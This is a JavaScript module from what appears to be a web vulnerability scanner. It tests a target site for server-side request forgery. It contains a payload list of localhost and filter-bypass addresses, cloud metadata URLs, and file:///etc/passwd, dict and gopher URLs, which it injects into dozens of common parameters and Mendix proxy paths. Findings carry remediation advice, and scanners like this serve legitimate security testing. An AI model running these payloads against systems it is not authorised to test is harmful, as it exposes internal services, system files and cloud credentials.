const axios = require('axios');
const { URL } = require('url');

// SSRF test payloads — internal/cloud metadata URLs
const SSRF_TARGETS = [
  // Localhost variants
  { url: 'http://127.0.0.1', name: 'IPv4 Localhost', category: 'internal' },
  { url: 'http://localhost', name: 'Localhost', category: 'internal' },
  { url: 'http://[::1]', name: 'IPv6 Localhost', category: 'internal' },
  { url: 'http://0.0.0.0', name: 'All Interfaces', category: 'internal' },
  { url: 'http://0177.0.0.1', name: 'Octal Localhost', category: 'bypass' },
  { url: 'http://0x7f.0.0.1', name: 'Hex Localhost', category: 'bypass' },
  { url: 'http://2130706433', name: 'Decimal Localhost', category: 'bypass' },

  // Private IP ranges
  { url: 'http://10.0.0.1', name: 'Private 10.x', category: 'internal' },
  { url: 'http://172.16.0.1', name: 'Private 172.16.x', category: 'internal' },
  { url: 'http://192.168.1.1', name: 'Private 192.168.x', category: 'internal' },

  // Cloud metadata endpoints
  { url: 'http://169.254.169.254/latest/meta-data/', name: 'AWS Metadata', category: 'cloud' },
  { url: 'http://169.254.169.254/computeMetadata/v1/', name: 'GCP Metadata', category: 'cloud' },
  { url: 'http://169.254.169.254/metadata/instance', name: 'Azure Metadata', category: 'cloud' },
  { url: 'http://100.100.100.200/latest/meta-data/', name: 'Alibaba Cloud Metadata', category: 'cloud' },

  // Internal services
  { url: 'http://127.0.0.1:8080', name: 'Internal Service 8080', category: 'internal' },
  { url: 'http://127.0.0.1:3306', name: 'MySQL Internal', category: 'internal' },
  { url: 'http://127.0.0.1:5432', name: 'PostgreSQL Internal', category: 'internal' },
  { url: 'http://127.0.0.1:6379', name: 'Redis Internal', category: 'internal' },
  { url: 'http://127.0.0.1:27017', name: 'MongoDB Internal', category: 'internal' },

  // Protocol handlers
  { url: 'file:///etc/passwd', name: 'File Protocol (Unix)', category: 'protocol' },
  { url: 'file:///c:/windows/win.ini', name: 'File Protocol (Windows)', category: 'protocol' },
  { url: 'dict://127.0.0.1:6379/info', name: 'Dict Protocol', category: 'protocol' },
  { url: 'gopher://127.0.0.1:25', name: 'Gopher Protocol', category: 'protocol' },
];

// Parameters commonly used for URL fetching (SSRF-prone)
const URL_PARAMS = [
  'url', 'uri', 'path', 'redirect', 'return', 'next', 'dest', 'destination',
  'redir', 'redirect_uri', 'redirect_url', 'return_url', 'return_to',
  'rurl', 'go', 'goto', 'target', 'link', 'src', 'source', 'ref',
  'page', 'pageurl', 'feed', 'host', 'site', 'html', 'data', 'load',
  'request', 'fetch', 'proxy', 'img', 'image', 'file', 'document',
  'folder', 'root', 'include', 'navigate', 'open', 'domain', 'callback',
  'continue', 'window', 'to', 'out', 'view', 'dir', 'show', 'navigation',
  'from', 'api', 'endpoint', 'service', 'resource'
];

async function scan(targetUrl, options = {}) {
  const findings = [];
  const url = new URL(targetUrl);

  // Phase 1: Check for URL-accepting parameters
  const paramsToTest = new Set();
  for (const [key] of url.searchParams) {
    paramsToTest.add(key);
  }
  for (const p of URL_PARAMS) {
    paramsToTest.add(p);
  }

  // Phase 2: Test for SSRF via URL parameters
  for (const param of paramsToTest) {
    // First, test with an external URL to see if the parameter accepts URLs
    try {
      const canaryUrl = `http://ssrf-canary-${Date.now()}.example.com`;
      const testUrl = new URL(targetUrl);
      testUrl.searchParams.set(param, canaryUrl);

      const response = await axios.get(testUrl.toString(), {
        timeout: 8000,
        maxRedirects: 0, // Don't follow redirects
        validateStatus: () => true,
        headers: { 'User-Agent': 'UniversalVAPTScanner/1.0', ...(options.headers || {}) }
      });

      // Check if the server tried to fetch or redirect to our canary
      if (response.status >= 300 && response.status < 400) {
        const location = response.headers.location || '';
        if (location.includes('ssrf-canary')) {
          findings.push({
            id: `ssrf-open-redirect-${param}`,
            title: `Open Redirect via ${param}`,
            category: 'SSRF',
            severity: 'medium',
            description: `Parameter "${param}" allows redirecting to arbitrary URLs (Open Redirect). This can be chained with SSRF or used for phishing.`,
            evidence: `Parameter: ${param}, Input: ${canaryUrl}, Redirect: ${location}`,
            remediation: 'Validate redirect URLs against an allowlist. Do not allow user-controlled redirects to arbitrary domains.',
            reference: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect'
          });
        }
      }

    } catch (err) {
      // Skip
    }

    // Test with internal URLs
    const testTargets = SSRF_TARGETS.slice(0, 8); // Test a subset to avoid slowness
    for (const ssrf of testTargets) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, ssrf.url);

        const normalUrl = new URL(targetUrl);
        normalUrl.searchParams.set(param, 'https://www.google.com');

        const [ssrfResp, normalResp] = await Promise.all([
          axios.get(testUrl.toString(), {
            timeout: 8000,
            maxRedirects: 0,
            validateStatus: () => true,
            headers: { 'User-Agent': 'UniversalVAPTScanner/1.0', ...(options.headers || {}) }
          }).catch(() => null),
          axios.get(normalUrl.toString(), {
            timeout: 8000,
            maxRedirects: 0,
            validateStatus: () => true,
            headers: { 'User-Agent': 'UniversalVAPTScanner/1.0', ...(options.headers || {}) }
          }).catch(() => null),
        ]);

        if (ssrfResp && normalResp) {
          const ssrfBody = typeof ssrfResp.data === 'string' ? ssrfResp.data : '';
          const normalBody = typeof normalResp.data === 'string' ? normalResp.data : '';

          // Check for indicators that the server fetched internal content
          const internalIndicators = [
            /root:.*:0:0/i, // /etc/passwd
            /\[fonts\]/i, // win.ini
            /localhost/i,
            /internal/i,
            /ami-id/i, // AWS metadata
            /instance-id/i,
            /private.ip/i,
          ];

          for (const indicator of internalIndicators) {
            if (indicator.test(ssrfBody) && !indicator.test(normalBody)) {
              findings.push({
                id: `ssrf-confirmed-${param}-${ssrf.name.replace(/\s+/g, '-')}`,
                title: `SSRF Confirmed: ${ssrf.name} via ${param}`,
                category: 'SSRF',
                severity: 'critical',
                description: `The server fetched internal resource "${ssrf.url}" when injected via parameter "${param}". Internal content was reflected in the response.`,
                evidence: `Parameter: ${param}, Payload: ${ssrf.url}, Internal content detected in response`,
                remediation: 'Implement URL validation and allowlisting. Block requests to private IP ranges and cloud metadata endpoints. Use network-level controls.',
                reference: 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
              });
              break;
            }
          }

          // Check for different response patterns (may indicate server-side fetch)
          if (ssrfResp.status !== normalResp.status && ssrfResp.status === 200) {
            if (Math.abs(ssrfBody.length - normalBody.length) > normalBody.length * 0.5) {
              findings.push({
                id: `ssrf-possible-${param}-${ssrf.name.replace(/\s+/g, '-')}`,
                title: `Possible SSRF: ${ssrf.name} via ${param}`,
                category: 'SSRF',
                severity: 'high',
                description: `Parameter "${param}" shows significantly different response when given internal URL "${ssrf.url}". This may indicate the server is fetching the URL.`,
                evidence: `Parameter: ${param}, Payload: ${ssrf.url}, Response size difference detected (SSRF: ${ssrfBody.length}, Normal: ${normalBody.length})`,
                remediation: 'Validate and sanitize all URL inputs. Implement allowlists for URL fetching. Block private IP ranges.',
                reference: 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
              });
            }
          }
        }
      } catch (err) {
        continue;
      }
    }

    await sleep(150);
  }

  // Phase 3: Check for Mendix-specific SSRF vectors
  const mendixSsrfPaths = [
    '/api/v1/proxy',
    '/rest/proxy',
    '/ws/proxy',
    '/xas/proxy',
    '/file',
    '/link/',
  ];

  for (const path of mendixSsrfPaths) {
    try {
      const testUrl = new URL(targetUrl);
      testUrl.pathname = path;
      testUrl.searchParams.set('url', 'http://127.0.0.1');

      const response = await axios.get(testUrl.toString(), {
        timeout: 8000,
        maxRedirects: 0,
        validateStatus: () => true,
        headers: { 'User-Agent': 'UniversalVAPTScanner/1.0', ...(options.headers || {}) }
      });

      if (response.status === 200) {
        findings.push({
          id: `ssrf-mendix-proxy-${path.replace(/\//g, '-')}`,
          title: `Mendix Proxy Endpoint Accessible: ${path}`,
          category: 'SSRF',
          severity: 'medium',
          description: `The Mendix endpoint "${path}" is accessible and may accept URL parameters. This could be exploited for SSRF.`,
          evidence: `Path: ${path}, Status: ${response.status}`,
          remediation: 'Restrict access to proxy endpoints. Implement URL validation and allowlisting.',
          reference: 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
        });
      }
    } catch (err) {
      continue;
    }
  }

  return findings;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = { scan };
